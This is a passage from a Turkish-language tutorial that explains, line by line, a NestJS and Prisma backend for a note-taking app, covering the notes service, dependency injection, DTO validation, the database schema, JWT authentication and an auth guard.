    - `contains`: İçerir (SQL `LIKE`)
    - `mode: 'insensitive'`: Büyük/küçük harf duyarsız.
- `include`: İlişkili verileri getir.
  - `tags: { include: { tag: true } }`: Notun etiketlerini getir. `NoteTag` junction table'ından geçerek `Tag` modelinin kendisini getir.
  - `blocks: { orderBy: { order: 'asc' } }`: Notun bloklarını sıralı getir.
- `orderBy`: Sıralama.
  - `[{ isPinned: 'desc' }, { updatedAt: 'desc' }]`: Önce sabitlenenler (`desc` = büyükten küçüğe, `true` önce gelir), sonra en son güncellenenler.

```typescript
  async findOne(userId: string, id: string) {
    const note = await this.prisma.note.findFirst({
      where: { id, userId },
      include: { tags: { include: { tag: true } }, blocks: { orderBy: { order: 'asc' } } },
    });
    if (!note) throw new NotFoundException('Note not found');
    return note;
  }
```

- `findFirst`: İlk eşleşen kaydı getirir. `findUnique`'den farkı, `where` içinde `userId` gibi ek filtreler kullanabilmenizdir.
- `if (!note) throw new NotFoundException(...)`: Not bulunamazsa NestJS otomatik olarak HTTP 404 döner.

```typescript
  async create(userId: string, dto: CreateNoteDto) {
    return this.prisma.note.create({
      data: {
        userId,
        title: dto.title || 'Untitled',
        isPinned: dto.isPinned ?? false,
      },
      include: { tags: { include: { tag: true } }, blocks: true },
    });
  }
```

- `prisma.note.create`: Yeni kayıt oluşturur.
- `data`: Oluşturulacak veri.
  - `dto.title || 'Untitled'`: Eğer title verilmediyse varsayılan değer.
  - `dto.isPinned ?? false`: `??` (nullish coalescing): Sadece `null` veya `undefined` ise `false` kullanır. `0` veya `''` için kullanmaz.

```typescript
  async update(userId: string, id: string, dto: UpdateNoteDto) {
    await this.findOne(userId, id);
    const note = await this.prisma.note.update({
      where: { id },
      data: dto,
      include: { tags: { include: { tag: true } }, blocks: { orderBy: { order: 'asc' } } },
    });
```

- `await this.findOne(userId, id)`: Önce notun varlığını ve sahipliğini kontrol et.
- `prisma.note.update`: Kaydı güncelle. `where: { id }` hangi kaydı güncelleyeceğini belirtir.
- `data: dto`: Güncellenecek alanlar. Prisma, sadece `dto`'da verilen alanları günceller.

```typescript
    if (dto.title !== undefined) {
      const plainText = note.blocks
        .map((b) => {
          const c = b.content as any;
          return c.text || c.html || '';
        })
        .join(' ');
      if (plainText.length > 20) {
        this.aiService.processNote(note.id, note.title, plainText).catch(() => {});
      }
    }
    return note;
  }
```

- Eğer title güncellendiyse, AI özetlemesi tetiklenir.
- `note.blocks.map(...)`: Tüm blokların metin içeriğini birleştirir.
- `this.aiService.processNote(...).catch(() => {})`: AI işlemi asenkron ve başarısız olabilir. `.catch(() => {})` ile hatayı yutaruz (fire-and-forget). Not güncellemesi AI hatasından etkilenmez.

```typescript
  async remove(userId: string, id: string) {
    await this.findOne(userId, id);
    await this.prisma.note.update({
      where: { id },
      data: { isArchived: true },
    });
    return { message: 'Note archived' };
  }
}
```

- Soft delete: Kaydı fiziksel olarak silmek yerine `isArchived = true` yaparız.
- Bu sayede yanlışlıkla silinen notlar geri getirilebilir.

#### Module

Module'ler, ilgili controller, service ve diğer sağlayıcıları bir araya getirir.

```typescript
@Module({
  controllers: [NotesController],
  providers: [NotesService],
  imports: [AiModule],
})
export class NotesModule {}
```

- `controllers`: Bu modülün controller'ları.
- `providers`: Bu modülün service'leri ve diğer injectable class'ları.
- `imports`: Bu modülün kullandığı diğer modüller. `AiModule` import edilmezse `AiService` enjekte edilemez.

### 4.2 Dependency Injection (Bağımlılık Enjeksiyonu)

**DI Nedir?**

Dependency Injection, bir sınıfın ihtiyaç duyduğu bağımlılıkları (başka sınıflar) dışarıdan almasıdır. Kendi içinde oluşturmak yerine, constructor üzerinden enjekte edilir.

**Neden DI?**

| Avantaj | Açıklama |
|---------|----------|
| **Test Edilebilirlik** | Mock bağımlılıklar enjekte ederek izole test yazabilirsiniz. |
| **Bağımlılık Yönetimi** | NestJS bağımlılıkları otomatik çözer, singleton instance'ları yönetir. |
| ** gevşek Bağlılık** | Sınıflar birbirinin concrete implementasyonuna bağımlı değildir. |

**Nasıl Çalışır?**

```typescript
// Bir servis DI container'a kaydedilir
@Injectable()
class PrismaService { }

// Başka bir servis onu talep eder
@Injectable()
class NotesService {
  constructor(private prisma: PrismaService) {}
}

// NestJS DI Container:
// 1. PrismaService instance'ı oluşturur (singleton)
// 2. NotesService oluştururken constructor'a PrismaService instance'ını verir
```

**Singleton Pattern:** NestJS'te default olarak tüm provider'lar singleton'dur. Yani uygulama boyunca tek bir instance oluşturulur ve herkes aynı instance'ı kullanır.

### 4.3 Decorator'lar (Süsleyiciler / Annotation'lar)

Decorator'lar, TypeScript'in experimental bir özelliğidir (Stage 3 ECMAScript proposal). Bir class, method, property veya parametreye metadata ekler.

**NestJS'te Kullanılan Decorator'lar:**

#### Class Decorator'ları

```typescript
@Controller('notes')      // Bu class bir controller'dır, base path /notes
@Injectable()             // Bu class DI container'a kaydedilir
@Module({...})            // Bu class bir modüldür
@WebSocketGateway({...})  // Bu class bir WebSocket gateway'dir
```

#### Method Decorator'ları

```typescript
@Get()          // GET isteğini karşılar
@Post()         // POST isteğini karşılar
@Patch()        // PATCH isteğini karşılar
@Delete()       // DELETE isteğini karşılar
@Public()       // AuthGuard'dan muaf tutar
@UseGuards(...) // Guard uygular
@HttpCode(200)  // HTTP durum kodunu belirler
```

#### Parameter Decorator'ları

```typescript
@Body()         // Request body
@Param('id')    // URL path parametresi
@Query('search')// URL query parametresi
@CurrentUser('sub') // Custom decorator
@Headers()      // Request headers
```

**Custom Decorator Nasıl Yazılır?**

```typescript
import { createParamDecorator, ExecutionContext } from '@nestjs/common';

export const CurrentUser = createParamDecorator(
  (data: keyof any | undefined, ctx: ExecutionContext) => {
    const request = ctx.switchToHttp().getRequest();
    const user = request.user;
    return data ? user?.[data] : user;
  },
);
```

- `createParamDecorator`: NestJS'in custom parametre decorator'ı oluşturma fonksiyonu.
- `data: keyof any | undefined`: Decorator'a verilen parametre. `@CurrentUser('sub')` çağrısında `data = 'sub'` olur.
- `ctx: ExecutionContext`: NestJS'in execution context'i. HTTP, WebSocket, RPC gibi farklı context türlerini soyutlar.
- `ctx.switchToHttp().getRequest()`: HTTP request objesini alır.
- `request.user`: `AuthGuard`'ın doğrulama sonrası yerleştirdiği JWT payload'ı.
- `data ? user?.[data] : user`: Eğer `data` verildiyse (örn. `'sub'`), `user.sub` döner. Verilmediyse tüm `user` objesini döner.

### 4.4 DTO (Data Transfer Object) ve Validasyon

**DTO Nedir?**

DTO, veri transfer objesidir. API'ye gelen ve giden verilerin yapısını tanımlar.

**`create-note.dto.ts`:**

```typescript
import { IsString, IsOptional, IsBoolean } from 'class-validator';

export class CreateNoteDto {
  @IsString()
  @IsOptional()
  title?: string;

  @IsBoolean()
  @IsOptional()
  isPinned?: boolean;
}
```

- `class-validator`: Decorator'larla validasyon kuralları tanımlar.
- `@IsString()`: Bu alan string olmalı.
- `@IsOptional()`: Bu alan zorunlu değil.
- `@IsBoolean()`: Bu alan boolean olmalı.
- `title?: string`: TypeScript'te `?` işareti opsiyonel alan belirtir.

**ValidationPipe Nasıl Çalışır?**

```typescript
app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
```

- `ValidationPipe`: NestJS'in built-in pipe'ı. `@Body()` ile gelen veriyi DTO'ya göre doğrular.
- `whitelist: true`: DTO'da tanımlanmamış alanları otomatik siler. Örneğin DTO'da `hackedField` yoksa, kullanıcı bunu gönderse bile silinir.
- `transform: true`: Gelen veriyi DTO tipine otomatik dönüştürür. Örneğin `"true"` string'ini `true` boolean'ına çevirebilir.

**Örnek Validasyon Hatası:**

```json
{
  "statusCode": 400,
  "message": ["title must be a string"],
  "error": "Bad Request"
}
```

### 4.5 `main.ts` — Uygulama Başlangıcı

```typescript
import { NestFactory } from '@nestjs/core';
import { ValidationPipe } from '@nestjs/common';
import cookieParser from 'cookie-parser';
import { AppModule } from './app.module';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);
```

- `NestFactory.create(AppModule)`: NestJS uygulamasını `AppModule`'den başlatır.
- `await`: Asenkron işlem, uygulama oluşturulana kadar bekler.

```typescript
  app.useGlobalPipes(new ValidationPipe({ whitelist: true, transform: true }));
```

- `useGlobalPipes`: Tüm controller'lar için geçerli pipe'lar.

```typescript
  app.use(cookieParser());
```

- `cookieParser`: HTTP request'lerindeki cookie'leri parse eder. `req.cookies` olarak erişilebilir.

```typescript
  app.enableCors({
    origin: process.env.FRONTEND_URL || 'http://localhost:5173',
    credentials: true,
  });
```

- `enableCors`: Cross-Origin Resource Sharing ayarları.
- `origin`: Hangi origin'lerden gelen isteklere izin verileceği.
- `credentials: true`: Cookie ve Authorization header'larının cross-origin isteklerde gönderilmesine izin verir.

```typescript
  await app.listen(process.env.PORT || 3001);
  console.log(`Application is running on: ${await app.getUrl()}`);
}
bootstrap();
```

- `app.listen(port)`: Belirtilen portta HTTP sunucusunu başlatır.
- `app.getUrl()`: Uygulamanın çalıştığı URL'yi döner.
- `bootstrap()`: Fonksiyonu çağırarak uygulamayı başlatır.

---

## 5. Backend: Prisma ORM ve Veritabanı Şeması

### 5.1 Prisma Service

```typescript
import { Injectable, OnModuleInit, OnModuleDestroy } from '@nestjs/common';
import { PrismaClient } from '@prisma/client';

@Injectable()
export class PrismaService
  extends PrismaClient
  implements OnModuleInit, OnModuleDestroy
{
  async onModuleInit() {
    await this.$connect();
  }

  async onModuleDestroy() {
    await this.$disconnect();
  }
}
```

- `extends PrismaClient`: Prisma'nın otomatik ürettiği client'ı genişletir.
- `implements OnModuleInit, OnModuleDestroy`: NestJS lifecycle hook'larını implement eder.
- `onModuleInit()`: Modül başlatıldığında çalışır. DB bağlantısını açar.
- `onModuleDestroy()`: Modül yok edildiğinde çalışır. DB bağlantısını kapatır.
- `$connect()`: Prisma Client'ın DB bağlantısını açma metodu.
- `$disconnect()`: Prisma Client'ın DB bağlantısını kapatma metodu.

### 5.2 Prisma Schema Dosyası

Prisma schema, veritabanı yapısını tanımlayan declarative bir dildir.

```prisma
generator client {
  provider        = "prisma-client-js"
  previewFeatures = ["postgresqlExtensions"]
}
```

- `generator client`: Prisma Client'ın nasıl üretileceğini tanımlar.
- `provider = "prisma-client-js"`: JavaScript/TypeScript client üret.
- `previewFeatures = ["postgresqlExtensions"]`: PostgreSQL extension'larını (pgvector gibi) destekler.

```prisma
datasource db {
  provider   = "postgresql"
  url        = env("DATABASE_URL")
  extensions = [pgvector(map: "vector")]
}
```

- `datasource db`: Veritabanı bağlantısını tanımlar.
- `provider = "postgresql"`: PostgreSQL kullanılıyor.
- `url = env("DATABASE_URL")`: Bağlantı URL'i çevre değişkeninden alınır.
- `extensions = [pgvector(map: "vector")]`: `pgvector` eklentisini etkinleştirir. `map: "vector"`, Prisma'nın `vector` tipini PostgreSQL'deki `vector` extension'ına eşler.

### 5.3 User Modeli

```prisma
model User {
  id            String    @id @default(cuid())
  email         String    @unique
  passwordHash  String
  name          String?
  role          UserRole  @default(USER)
  createdAt     DateTime  @default(now())
  updatedAt     DateTime  @updatedAt

  notes         Note[]
  tags          Tag[]
  sessions      Session[]
  notifications Notification[]
  chats         Chat[]
}

enum UserRole {
  USER
  ADMIN
}
```

**Alanların Açıklamaları:**

| Alan | Tip | Açıklama |
|------|-----|----------|
| `id` | `String` | Kullanıcının benzersiz kimliği. |
| `@id` | Attribute | Bu alan primary key'dir. |
| `@default(cuid())` | Attribute | Otomatik CUID (Collision-resistant Unique Identifier) üretir. UUID'ye göre daha kısa ve sıralanabilir. |
| `email` | `String` | Kullanıcının e-posta adresi. |
| `@unique` | Attribute | Bu alan tekrar edemez. Aynı email ile iki kullanıcı oluşturulamaz. |
| `passwordHash` | `String` | bcrypt ile hash'lenmiş şifre. Asla düz metin saklanmaz. |
| `name` | `String?` | Kullanıcının adı. `?` işareti nullable (opsiyonel) olduğunu belirtir. |
| `role` | `UserRole` | Kullanıcının rolü. Enum tipindedir. |
| `@default(USER)` | Attribute | Varsayılan değer `USER`'dır. |
| `createdAt` | `DateTime` | Kaydın oluşturulma zamanı. |
| `@default(now())` | Attribute | Varsayılan değer şu anki zamandır. |
| `updatedAt` | `DateTime` | Kaydın son güncellenme zamanı. |
| `@updatedAt` | Attribute | Her güncellemede otomatik olarak şu anki zamana ayarlanır. |

**İlişkiler:**

- `notes Note[]`: Bir kullanıcının birden fazla notu olabilir (1:N ilişki).
- `tags Tag[]`: Bir kullanıcının birden fazla etiketi olabilir (1:N ilişki).
- `sessions Session[]`: Bir kullanıcının birden fazla session'ı olabilir (1:N ilişki).
- `notifications Notification[]`: Bir kullanıcının birden fazla bildirimi olabilir (1:N ilişki).
- `chats Chat[]`: Bir kullanıcının birden fazla sohbeti olabilir (1:N ilişki).

**Enum (Enumeration):**

```prisma
enum UserRole {
  USER
  ADMIN
}
```

Enum, bir değişkenin sadece belirli değerler alabileceğini belirtir. TypeScript'te de karşılığı oluşturulur:

```typescript
type UserRole = 'USER' | 'ADMIN';
```

### 5.4 Session Modeli

```prisma
model Session {
  id           String   @id @default(cuid())
  userId       String
  refreshToken String   @unique
  expiresAt    DateTime
  createdAt    DateTime @default(now())

  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
}
```

- `refreshToken`: Kullanıcının refresh token'ı. `@unique` ile tekrar edemez.
- `expiresAt`: Token'ın geçerlilik süresi. Bu tarihten sonra token kullanılamaz.
- `@relation`: İlişkiyi tanımlar.
  - `fields: [userId]`: Bu modeldeki hangi alan ilişkiyi sağlar.
  - `references: [id]`: Karşı modeldeki hangi alana referans verir.
  - `onDelete: Cascade`: Kullanıcı silinirse, bu kullanıcıya ait tüm session'lar da otomatik silinir.

### 5.5 Note Modeli

```prisma
model Note {
  id          String   @id @default(cuid())
  title       String   @default("Untitled")
  userId      String
  summary     String?
  isArchived  Boolean  @default(false)
  isPinned    Boolean  @default(false)
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt

  user       User        @relation(fields: [userId], references: [id], onDelete: Cascade)
  blocks     Block[]
  tags       NoteTag[]
  embedding  Embedding?
}
```

- `title`: Notun başlığı. `@default("Untitled")` ile başlık verilmezse "Untitled" olur.
- `summary`: AI tarafından üretilen özet. Nullable.
- `isArchived`: Arşiv durumu. `true` ise not arşivlenmiştir.
- `isPinned`: Sabitleme durumu. `true` ise not en üstte gösterilir.
- `embedding Embedding?`: Her notun en fazla bir embedding'i olabilir (1:1 ilişki). `?` ile opsiyonel.

### 5.6 Block Modeli

```prisma
model Block {
  id        String   @id @default(cuid())
  noteId    String
  type      BlockType
  content   Json
  order     Int
  createdAt DateTime @default(now())

  note Note @relation(fields: [noteId], references: [id], onDelete: Cascade)

  @@index([noteId])
}

enum BlockType {
  paragraph
  heading
  bulletList
  orderedList
  codeBlock
  blockquote
  image
  divider
  callout
}
```

- `type BlockType`: Block'un tipi. Enum değerlerinden biri olmalıdır.
- `content Json`: Block'un içeriği JSON formatında saklanır. Bu sayede farklı tipteki bloklar farklı yapıda veri saklayabilir:
  - Paragraph: `{ text: "Merhaba dünya" }`
  - Heading: `{ level: 1, text: "Başlık" }`
  - Image: `{ src: "https://...", alt: "Açıklama" }`
- `order Int`: Block'un not içindeki sırası. 0, 1, 2, ...
- `@@index([noteId])`: `noteId` alanı üzerinde veritabanı index'i oluşturur. `noteId`'ye göre sorgular daha hızlı çalışır.

**Neden `@@index`?**

Index'ler, veritabanı sorgularının hızını artırır. Ancak yazma işlemlerini (INSERT, UPDATE, DELETE) yavaşlatır ve disk alanı kullanır. Sık sorgulanan alanlarda kullanılmalıdır.

### 5.7 Tag ve NoteTag (Çoğa-Çok İlişki)

```prisma
model Tag {
  id        String   @id @default(cuid())
  name      String
  color     String   @default("#3b82f6")
  userId    String
  createdAt DateTime @default(now())

  user    User    @relation(fields: [userId], references: [id], onDelete: Cascade)
  notes   NoteTag[]

  @@unique([name, userId])
}
```

- `color`: Etiketin rengi. Hex formatında. Varsayılan `#3b82f6` (Tailwind blue-500).
- `@@unique([name, userId])`: Birleşik unique constraint. Aynı kullanıcı aynı isimde iki etiket oluşturamaz. Farklı kullanıcılar aynı isimde etiket oluşturabilir.

```prisma
model NoteTag {
  noteId String
  tagId  String

  note Note @relation(fields: [noteId], references: [id], onDelete: Cascade)
  tag  Tag  @relation(fields: [tagId], references: [id], onDelete: Cascade)

  @@id([noteId, tagId])
}
```

`NoteTag` modeli, `Note` ve `Tag` arasındaki **çoğa-çok (N:M)** ilişkiyi çözmek için kullanılan bir **junction table** (ara tablo, birleştirme tablosu)dur.

**Çoğa-Çok İlişki Mantığı:**

- Bir notun birden fazla etiketi olabilir.
- Bir etiket birden fazla nota atanabilir.
- İlişkisel veritabanları doğrudan N:M ilişkiyi desteklemez. Bu yüzden ara tablo kullanılır.

```
Note (1) ────< NoteTag >──── (N) Tag
```

- `@@id([noteId, tagId])`: Birleşik primary key. Aynı nota aynı etiket iki kez atanamaz.

### 5.8 Embedding Modeli

```prisma
model Embedding {
  id        String   @id @default(uuid())
  noteId    String   @unique
  vector    Unsupported("vector(1536)")
  createdAt DateTime @default(now())

  note Note @relation(fields: [noteId], references: [id], onDelete: Cascade)
}
```

- `vector Unsupported("vector(1536)")`: Prisma'nın doğrudan desteklemediği ama PostgreSQL + pgvector'ın anladığı bir tip. `Unsupported` kullanıldığında Prisma bu alanı passthrough yapar (doğrudan DB'ye iletir).
- `1536`: Vektörün boyutu. OpenAI embedding modelleri genellikle 1536 boyutlu vektör üretir.
- `noteId @unique`: Her notun en fazla bir embedding'i olur (1:1 ilişki).

**Embedding Nedir?**

Embedding, metinleri sayısal vektörlere dönüştürme işlemidir. Örneğin "para biriktirme" cümlesi 1536 boyutlu bir vektöre çevrilir. İki vektör arasındaki kosinüs benzerliği (cosine similarity), iki metnin anlamsal olarak ne kadar yakın olduğunu gösterir.

### 5.9 Notification Modeli

```prisma
model Notification {
  id        String   @id @default(cuid())
  userId    String
  type      String
  message   String
  isRead    Boolean  @default(false)
  createdAt DateTime @default(now())

  user User @relation(fields: [userId], references: [id], onDelete: Cascade)
}
```

- `type`: Bildirim tipi. Örneğin: `"NOTE_CREATED"`, `"AI_SUMMARY_READY"`.
- `isRead`: Bildirim okundu mu? Varsayılan `false`.

### 5.10 Chat ve Message Modelleri

```prisma
model Chat {
  id          String   @id @default(cuid())
  title       String   @default("Yeni Sohbet")
  userId      String
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt

  user     User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  messages Message[]
}

model Message {
  id        String      @id @default(cuid())
  chatId    String
  role      MessageRole
  content   String
  createdAt DateTime    @default(now())

  chat Chat @relation(fields: [chatId], references: [id], onDelete: Cascade)

  @@index([chatId])
}

enum MessageRole {
  user
  assistant
}
```

- `Chat`: Bir sohbet (konuşma) odasını temsil eder.
- `Message`: Bir sohbet mesajını temsil eder.
- `role MessageRole`: Mesajı kim göndermiş? `user` (kullanıcı) veya `assistant` (AI).
- `@@index([chatId])`: `chatId`'ye göre mesajları hızlıca getirmek için index.

---

## 6. Backend: Kimlik Doğrulama (Auth) Sistemi

### 6.1 Kimlik Doğrulama Nedir?

Kimlik doğrulama (authentication), bir kullanıcının iddia ettiği kişi olduğunu doğrulama sürecidir. Sisteminize giriş yapmak isteyen kişinin gerçekten o kullanıcı olduğundan emin olmanız gerekir.

**Kimlik doğrulama vs Yetkilendirme:**

| Kavram | Anlamı | Örnek |
|--------|--------|-------|
| **Kimlik Doğrulama (Authentication)** | Sen kimsin? | E-posta ve şifre ile giriş yapmak |
| **Yetkilendirme (Authorization)** | Ne yapmana izin var? | Admin paneline erişim, başkasının notunu silme |

### 6.2 JWT (JSON Web Token) Derinlemesine

#### JWT Yapısı

JWT, nokta (`.`) ile ayrılmış üç bölümden oluşur:

```
xxxxx.yyyyy.zzzzz
  ↑      ↑      ↑
Header Payload Signature
```

**Header:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```
- `alg`: İmza algoritması (HMAC SHA-256).
- `typ`: Token tipi.

Base64Url encode edilir: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

**Payload:**
```json
{
  "sub": "user_abc123",
  "email": "ali@example.com",
  "role": "USER",
  "iat": 1700000000,
  "exp": 1700000900
}
```
- `sub` (subject): Kullanıcının benzersiz kimliği.
- `email`: Kullanıcının e-posta adresi.
- `role`: Kullanıcının rolü.
- `iat` (issued at): Token'ın oluşturulma zamanı (Unix timestamp).
- `exp` (expiration): Token'ın geçerlilik süresinin bitiş zamanı.

Base64Url encode edilir.

**Signature:**
```
HMACSHA256(
  base64Url(header) + "." + base64Url(payload),
  secret
)
```

- `secret`: Sunucuda gizli tutulan bir string. Bu string olmadan geçerli imza oluşturulamaz.

#### Neden İki Token?

Projede iki tür JWT kullanılır:

| Token | Süre | Kullanım Amacı | Risk Çalınırsa |
|-------|------|----------------|----------------|
| **Access Token** | 15 dakika | Her API isteğinde kimlik doğrulama | Sadece 15 dakika pencere |
| **Refresh Token** | 7 gün | Access token süresi dolunca yeni token almak | Sadece `/auth/refresh`'te kullanılabilir |

**Neden access token kısa, refresh token uzun?**

- Access token her istekte gönderilir. Eğer çalınırsa saldırgan sınırlı sürede (15 dk) kullanabilir.
- Refresh token sadece `/auth/refresh` endpoint'inde kullanılır. Daha az yerde dolaştığı için çalınma riski daha düşüktür.
- Kısa ömürlü access token, long-lived refresh token pattern'idir.

### 6.3 AuthService Kodunu Satır Satır İnceleyelim

```typescript
import {
  Injectable,
  ConflictException,
  UnauthorizedException,
} from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import * as bcrypt from 'bcrypt';
import { PrismaService } from '../../prisma/prisma.service';
import { RegisterDto } from './dto/register.dto';
import { LoginDto } from './dto/login.dto';
```

- `Injectable`: DI container'a kayıt.
- `ConflictException`: HTTP 409 durum kodu. Kaynak çakışması (aynı email ile kayıt).
- `UnauthorizedException`: HTTP 401 durum kodu. Yetkisiz erişim.
- `JwtService`: NestJS'in JWT işlemleri için sağladığı servis.
- `bcrypt`: Şifre hash'leme kütüphanesi.

```typescript
@Injectable()
export class AuthService {
  constructor(
    private prisma: PrismaService,
    private jwtService: JwtService,
  ) {}
```

- `AuthService`, `PrismaService` ve `JwtService`'e bağımlıdır.

#### Register (Kayıt Olma)

```typescript
  async register(dto: RegisterDto) {
    const existing = await this.prisma.user.findUnique({
      where: { email: dto.email },
    });
    if (existing) throw new ConflictException('Email already in use');
```

- `findUnique`: `@unique` ile işaretlenmiş alana göre tek kayıt getirir.
- `where: { email: dto.email }`: Bu email'e sahip kullanıcı var mı?
- Eğer varsa `ConflictException` fırlatır (HTTP 409).

```typescript
    const passwordHash = await bcrypt.hash(dto.password, 10);
```

- `bcrypt.hash(plainPassword, saltRounds)`:
  - `dto.password`: Kullanıcının girdiği düz metin şifre.
  - `10`: Salt rounds. 2^10 = 1024 iterasyon.
  - Algoritma: Şifre + rastgele salt → 1024 kez hash → sonuç.

**Neden `10` rounds?**

| Rounds | Süre (yaklaşık) | Güvenlik |
|--------|-----------------|----------|
| 8 | ~50 ms | Düşük |
| 10 | ~200 ms | Orta (önerilen) |
| 12 | ~800 ms | Yüksek |
| 14 | ~3 saniye | Çok yüksek |

10 rounds, güvenlik ve performans arasında dengeli bir seçimdir.

```typescript
    const user = await this.prisma.user.create({
      data: { email: dto.email, passwordHash, name: dto.name },
      select: { id: true, email: true, name: true, role: true },
    });
```

- `data`: Oluşturulacak veri. `passwordHash`'i saklarız, düz şifreyi asla!
- `select`: Sadece belirtilen alanları döndür. `passwordHash`'i döndürmemiş oluruz.

```typescript
    const tokens = await this.generateTokens(user.id, user.email, user.role);
    await this.saveRefreshToken(user.id, tokens.refreshToken);
    return { user, ...tokens };
  }
```

- `generateTokens`: Access ve refresh token üretir.
- `saveRefreshToken`: Refresh token'ı DB'ye kaydeder.
- `return { user, ...tokens }`: Kullanıcı bilgisi ve token'ları döner.

#### Login (Giriş Yapma)

```typescript
  async login(dto: LoginDto) {
    const user = await this.prisma.user.findUnique({
      where: { email: dto.email },
    });
    if (!user) throw new UnauthorizedException('Invalid credentials');
```

- Kullanıcı bulunamazsa `UnauthorizedException` (HTTP 401).
- **Güvenlik Notu:** Hem kullanıcı bulunamadığında hem de şifre yanlış olduğunda aynı mesajı dönmek önemlidir. Böylece saldırgan hangi e-posta adreslerinin kayıtlı olduğunu öğrenemez.

```typescript
    const valid = await bcrypt.compare(dto.password, user.passwordHash);
    if (!valid) throw new UnauthorizedException('Invalid credentials');
```

- `bcrypt.compare(plainPassword, hashedPassword)`:
  - Hash'in içindeki salt'ı çıkarır.
  - Düz şifreyi aynı salt ve rounds ile hash'ler.
  - İki hash'i sabit zamanlı (timing-safe) karşılaştırır.
  - Eşleşiyorsa `true`, değilse `false`.

#### Refresh Token

```typescript
  async refresh(token: string) {
    const session = await this.prisma.session.findUnique({
      where: { refreshToken: token },
      include: { user: true },
    });
    if (!session || session.expiresAt < new Date()) {
      throw new UnauthorizedException('Invalid refresh token');
    }
```

- `findUnique({ where: { refreshToken: token } })`: Bu refresh token'a sahip session var mı?
- `include: { user: true }`: Session ile birlikte ilişkili kullanıcıyı da getir.
- `session.expiresAt < new Date()`: Token'ın süresi dolmuş mu?

```typescript
    const tokens = await this.generateTokens(
      session.user.id,
      session.user.email,
      session.user.role,
    );
    await this.prisma.session.update({
      where: { id: session.id },
      data: { refreshToken: tokens.refreshToken, expiresAt: this.sevenDaysFromNow() },
    });
    return tokens;
  }
```

- Yeni token çifti üretilir.
- Session güncellenir: Eski refresh token yerine yeni refresh token kaydedilir.
- Bu, **Refresh Token Rotation** (refresh token döndürme) olarak bilinir. Eski token artık kullanılamaz.

#### Token Üretimi

```typescript
  private async generateTokens(userId: string, email: string, role: string) {
    const jwtSecret = process.env.JWT_SECRET;
    const jwtRefreshSecret = process.env.JWT_REFRESH_SECRET;
    if (!jwtSecret || !jwtRefreshSecret) {
      throw new Error('JWT_SECRET and JWT_REFRESH_SECRET are required');
    }
```

- Çevre değişkenlerinin ayarlanmış olduğunu kontrol eder.
- Eğer ayarlanmamışsa uygulama başlatılamaz. Bu, üretimde hardcoded secret kullanılmasını engeller.

```typescript
    const payload = { sub: userId, email, role };
```

- JWT payload'ı. `sub` (subject) alanına kullanıcı ID'si konur. Bu, JWT standardıdır.

```typescript
    const accessToken = await this.jwtService.signAsync(payload, {
      secret: jwtSecret,
      expiresIn: '15m',
    });
```

- `jwtService.signAsync`: Payload'ı imzalayarak JWT üretir.
- `secret`: İmza için kullanılan gizli anahtar.
- `expiresIn: '15m'`: Token 15 dakika sonra geçersiz olur.

```typescript
    const refreshToken = await this.jwtService.signAsync(payload, {
      secret: jwtRefreshSecret,
      expiresIn: '7d',
    });
    return { accessToken, refreshToken };
  }
```

- Refresh token, farklı bir secret ile imzalanır. Böylece access token ve refresh token birbirinin yerine kullanılamaz.

### 6.4 AuthController

```typescript
@Controller('auth')
export class AuthController {
  constructor(private authService: AuthService) {}

  @Public()
  @Post('register')
  register(@Body() dto: RegisterDto) {
    return this.authService.register(dto);
  }
```

- `@Public()`: Bu route `AuthGuard`'tan muaf tutulur. Kayıt olmak için giriş yapmış olmanıza gerek yoktur.
- `@Post('register')`: `POST /auth/register` isteklerini karşılar.

```typescript
  @Public()
  @Post('login')
  @HttpCode(HttpStatus.OK)
  login(@Body() dto: LoginDto) {
    return this.authService.login(dto);
  }
```

- `@HttpCode(HttpStatus.OK)`: Varsayılan olarak POST istekleri 201 (Created) döner. Login işlemi kaynak oluşturmadığı için 200 (OK) dönmeyi tercih ederiz.

```typescript
  @Public()
  @Post('refresh')
  @HttpCode(HttpStatus.OK)
  refresh(@Body() dto: RefreshDto) {
    return this.authService.refresh(dto.refreshToken);
  }
```

- Refresh token yenileme de public'tir çünkü token süresi dolmuş kullanıcılar yeni token almalıdır.

```typescript
  @Post('logout')
  @HttpCode(HttpStatus.OK)
  logout(@Body() dto: RefreshDto) {
    return this.authService.logout(dto.refreshToken);
  }
}
```

- Logout, refresh token'ı veritabanından siler. Böylece o token artık kullanılamaz.

---

## 7. Backend: Güvenlik Katmanı

### 7.1 AuthGuard — JWT Doğrulama

```typescript
import { CanActivate, ExecutionContext, Injectable, UnauthorizedException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { Reflector } from '@nestjs/core';
import { Request } from 'express';
import { IS_PUBLIC_KEY } from '../decorators/public.decorator';

@Injectable()
export class AuthGuard implements CanActivate {
  constructor(
    private jwtService: JwtService,
    private reflector: Reflector,
  ) {}
```

- `CanActivate`: NestJS guard interface'i. `canActivate` metodu `true` dönerse erişim izni verilir.
- `ExecutionContext`: NestJS'in execution context'i. HTTP, WebSocket, RPC gibi farklı context'leri soyutlar.
- `Reflector`: NestJS'in metadata okuma aracı. Decorator'ların bıraktığı metadata'yı okur.

```typescript
  async canActivate(context: ExecutionContext): Promise<boolean> {
    const isPublic = this.reflector.getAllAndOverride<boolean>(IS_PUBLIC_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);
    if (isPublic) {
      return true;
    }
```

- `getAllAndOverride`: Hem method hem de class seviyesindeki metadata'yı okur.
- `IS_PUBLIC_KEY`: `@Public()` decorator'ının bıraktığı metadata key'i.
- Eğer route `@Public()` ile işaretlenmişse, doğrulama yapılmadan `true` döner.

```typescript
    const request = context.switchToHttp().getRequest();
    const token = this.extractTokenFromHeader(request);
    if (!token) {
      throw new UnauthorizedException();
    }
```

- `switchToHttp().getRequest()`: HTTP request objesini alır.
- `extractTokenFromHeader`: `Authorization: Bearer <token>` header'ından token'i çıkarır.

```typescript
    try {
      const payload = await this.jwtService.verifyAsync(token, {
        secret: process.env.JWT_SECRET,
      });
      request['user'] = payload;
    } catch {
      throw new UnauthorizedException();
    }
    return true;
  }
```

